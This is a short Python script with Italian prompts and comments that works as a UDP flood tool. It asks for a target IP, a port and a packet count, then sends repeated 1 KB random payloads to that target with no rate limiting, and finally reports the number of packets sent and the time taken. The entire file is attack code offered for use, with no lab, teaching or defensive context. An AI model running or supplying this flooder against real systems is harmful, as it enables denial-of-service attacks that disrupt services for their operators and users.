import socket
import random
import sys
import time

def udp_flood():
    # Input dati
    target_ip = input("IP Target: ")
    try:
        target_port = int(input("Porta UDP: "))
        packet_count = int(input("Numero pacchetti da 1KB: "))
    except ValueError:
        print("Errore: Porta e numero pacchetti devono essere numeri interi.")
        sys.exit(1)

    # Configurazione Socket e Payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)  # Genera 1 KB di byte casuali

    print(f"\nInvio in corso verso {target_ip}:{target_port}...")
    
    sent_packets = 0
    start_time = time.time()

    try:
        for _ in range(packet_count):
            sock.sendto(payload, (target_ip, target_port))
            sent_packets += 1
            
    except KeyboardInterrupt:
        print("\nInterrotto dall'utente.")
    except Exception as e:
        print(f"\nErrore: {e}")
    finally:
        sock.close()
        duration = time.time() - start_time
        print(f"\nFinito. Pacchetti inviati: {sent_packets}/{packet_count}")
        print(f"Tempo impiegato: {duration:.4f} secondi")

if __name__ == "__main__":
    udp_flood()